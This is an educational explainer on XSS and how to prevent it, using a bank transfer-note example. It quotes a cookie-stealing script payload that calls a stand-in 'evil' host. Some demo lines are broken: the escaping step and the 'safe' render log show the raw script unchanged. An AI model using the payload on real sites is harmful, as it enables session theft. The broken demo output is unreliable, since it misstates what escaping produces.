title: What is XSS (Cross-Site Scripting) — attacker injects malicious JavaScript into a web page that runs in other users' browsers — and how to prevent it (escape HTML output, Content Security Policy header, validate/sanitize input)?
shortTitle: XSS (Cross-Site Scripting) and How to Prevent It
topicTitle: Web Vulnerabilities — SQLi, XSS, CSRF, SSRF

s1_definition.profdef: Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web page so that it executes in other users' browsers in the context of the trusted site. It lets the attacker steal cookies and tokens, perform actions as the victim, or deface the page. The core defense is contextual output encoding (escaping data when rendering it into HTML, attributes, or JavaScript), reinforced by a Content Security Policy header, input validation and sanitization for rich content, and marking session cookies HttpOnly so script cannot read them.
s1_definition.analogy: Suppose National Bank of India shows a "payment note" that customers type, and it displays the note on the recipient's screen exactly as written. A dishonest customer writes a note that is actually a hidden instruction: "secretly copy the reader's login and send it to me." When Priya opens the note, her browser obeys the hidden instruction as if the bank itself wrote it. XSS prevention is like the bank treating every customer note as plain text to be shown, never as an instruction to be followed — it prints the angle brackets and script words literally instead of running them.
s1_definition.oneliner: Escape untrusted data on output so the browser shows it as text, never runs it as script.
s1_definition.raw:
**Professional definition:** Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web page so that it executes in other users' browsers in the context of the trusted site. It lets the attacker steal cookies and tokens, perform actions as the victim, or deface the page. The core defense is contextual output encoding (escaping data when rendering it into HTML, attributes, or JavaScript), reinforced by a Content Security Policy header, input validation and sanitization for rich content, and marking session cookies HttpOnly so script cannot read them.

**In simple words (banking analogy):** Suppose National Bank of India shows a "payment note" that customers type, and it displays the note on the recipient's screen exactly as written. A dishonest customer writes a note that is actually a hidden instruction: "secretly copy the reader's login and send it to me." When Priya opens the note, her browser obeys the hidden instruction as if the bank itself wrote it. XSS prevention is like the bank treating every customer note as plain text to be shown, never as an instruction to be followed — it prints the angle brackets and script words literally instead of running them.

**One line to remember:** Escape untrusted data on output so the browser shows it as text, never runs it as script.

sections.s2_technical:
XSS comes in forms: stored XSS, where the payload is saved (for example in a payment note) and served to every viewer; reflected XSS, where the payload is echoed back from a request parameter; and DOM-based XSS, where client-side JavaScript writes untrusted data into the page. A classic payload is `<script>fetch('https://evil/?c='+document.cookie)</script>`; if rendered unescaped, the victim's browser runs it and exfiltrates their cookies.

The primary fix is contextual output encoding. When placing data in HTML body, encode `<`, `>`, `&`, `"`, `'` so they render as text. Template engines do this automatically: Thymeleaf's `th:text` escapes by default, and React escapes JSX expressions. The danger is explicitly unescaped output like Thymeleaf `th:utext` or React dangerouslySetInnerHTML. For rich HTML that must be allowed, sanitize with an allowlist library such as OWASP Java HTML Sanitizer rather than trying to blacklist.

Defense in depth adds a Content Security Policy header, for example `Content-Security-Policy: default-src 'self'; script-src 'self'`, which tells the browser to run only scripts from trusted origins and blocks inline injected scripts. Mark cookies HttpOnly so even a successful XSS cannot read the session token, and Secure and SameSite for further protection. The senior point: encoding must match the output context (HTML, attribute, URL, JavaScript) because the right escaping differs, input validation alone is insufficient because the same value is safe in one context and dangerous in another, and CSP is a safety net, not a substitute for encoding.
sections.s3_banking:
Problem 1 — National Bank of India lets Rajesh add a note when transferring money to Priya, and the note is displayed on Priya's dashboard. An attacker enters a note containing a script that steals the viewer's session. When Priya opens it, her account is compromised. This is exactly stored XSS — saved input runs as code for other users.

Problem 2 — The bank must display the note so Priya can read it, but must never let it execute. This is exactly what output encoding does — show the script text literally instead of running it — backed by a Content Security Policy as a safety net.

Our mini-project builds a `NoteRenderer` with an unsafe render (raw concatenation into HTML) and a safe render (HTML-escaped), plus a `CspPolicy` helper. The demo feeds a malicious note to both renderers: the unsafe one produces live script, the safe one produces inert escaped text, and we show the CSP header that would block inline scripts anyway.

sections.s5_journey:
Input data: a malicious transfer note containing a script tag that steals cookies. Step 1: `renderUnsafe` concatenates the note directly into a div. The resulting HTML contains a live script tag. When a victim's browser parses this, it runs the script and sends the victim's cookie to the attacker — stored XSS succeeds. Step 2: `renderSafe` first HTML-escapes the note, turning `<` into `<`, `>` into `>`, and quotes into entities. The resulting HTML shows the literal characters of the script as visible text inside the div. The browser displays "script ... script" as words and runs nothing — the attack is neutralized. Step 3: The demo prints the Content-Security-Policy header. Even if an unescaped value slipped through somewhere, the CSP restricts scripts to the site's own origin and blocks inline injected scripts, acting as a safety net. Step 4: Combined with HttpOnly cookies, even a hypothetical successful injection could not read the session token. The layered defense — contextual encoding first, CSP and HttpOnly as backups — is what protects the bank's users. ```text 2026-10-31 23:40:00.010 SEVERE [XssDefenseDemo] UNSAFE render contains executable script:
2026-10-31 23:40:00.012 INFO [XssDefenseDemo] SAFE render is inert (escaped):
<script>fetch('https://evil/?c='+document.cookie)</script>
2026-10-31 23:40:00.013 INFO [XssDefenseDemo] Response header -> Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none' ```

```text

```

sections.s6_takeaway:
Cross-Site Scripting, or XSS, is a vulnerability where an attacker injects malicious JavaScript into a web page so that it runs in other users' browsers in the context of the trusted site. Because the script runs as if the site wrote it, the attacker can steal cookies and tokens, act as the victim, or deface the page. It comes in stored, reflected, and DOM-based forms, and a typical payload reads document.cookie and sends it to an attacker's server.

The primary defense is contextual output encoding: whenever I render untrusted data into a page, I escape the special characters so the browser shows them as text rather than running them. Template engines help here — Thymeleaf's th:text and React's JSX expressions escape by default — and the danger points are the explicitly unescaped options like th:utext or dangerouslySetInnerHTML. For rich HTML that must be allowed, I sanitize with an allowlist library like the OWASP Java HTML Sanitizer rather than trying to blacklist bad tags.

In my banking project customers can attach a note to a transfer, and that note is shown on the recipient's dashboard, which is a classic stored XSS target. In my demo the unsafe renderer concatenated the note straight into HTML and produced a live script tag that would steal the viewer's session, while the safe renderer HTML-escaped it so the browser displayed the script as harmless visible text and ran nothing.

For defense in depth I add a Content-Security-Policy header that restricts scripts to the site's own origin and blocks inline injected scripts, and I mark session cookies HttpOnly, Secure, and SameSite so that even a successful injection cannot read the token. The nuance I stress is that encoding must match the output context and that input validation alone is not enough, because the same value can be safe in one place and dangerous in another, so output encoding is the reliable foundation with CSP and HttpOnly as the safety net.

---

keyPoints: SQL Injection: use parameterized queries, never concatenate user input
XSS: sanitize output, use Content-Security-Policy header
CSRF: use anti-CSRF tokens, SameSite cookie attribute
SSRF: validate/whitelist URLs, block internal network access
